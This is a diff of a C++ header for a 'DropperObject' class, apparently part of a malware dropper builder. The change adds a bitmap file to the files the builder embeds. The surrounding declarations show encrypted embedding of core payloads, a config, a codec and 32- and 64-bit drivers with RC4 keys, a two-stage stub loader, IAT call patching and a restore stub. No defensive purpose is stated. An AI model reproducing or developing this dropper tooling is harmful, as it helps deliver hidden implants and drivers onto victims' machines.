@@ -48,6 +48,7 @@ private:
 		NamedFileBuffer driver;
 		NamedFileBuffer driver64;
 		NamedFileBuffer codec;
+		NamedFileBuffer bitmap;
 	} _files;
 	
 	PatchBuffer _patches[2]; // patch buffers for 2 stages of stub loader
@@ -55,7 +56,7 @@ private:
 	bool _readFile(std::string path, NamedFileBuffer& buffer);
 	char* _embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr );
 	int _embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr );
-	
+
 	void _setExecutableName(std::string name) 
 	{ 
 		std::list< std::string >::iterator iter = _strings.begin();
@@ -75,6 +76,7 @@ private:
 	bool _addCodecFile(std::string path, std::string name);
 	bool _addDriverFile(std::string path, std::string name);
 	bool _addDriver64File(std::string path, std::string name);
+	bool _addBitmapFile(std::string path, std::string name);
 	
 	int _getIATCallIndex(std::string dll, std::string call);
 
@@ -85,8 +87,7 @@ private:
 public:
 	DropperObject(PEObject& pe);
 	
-	bool build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix);
-	
+	bool build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix, bf::path demoBitmap );
 	char* getRestoreStub() 
 	{ 
 		DataSectionHeader* header = (DataSectionHeader*)_data.get();
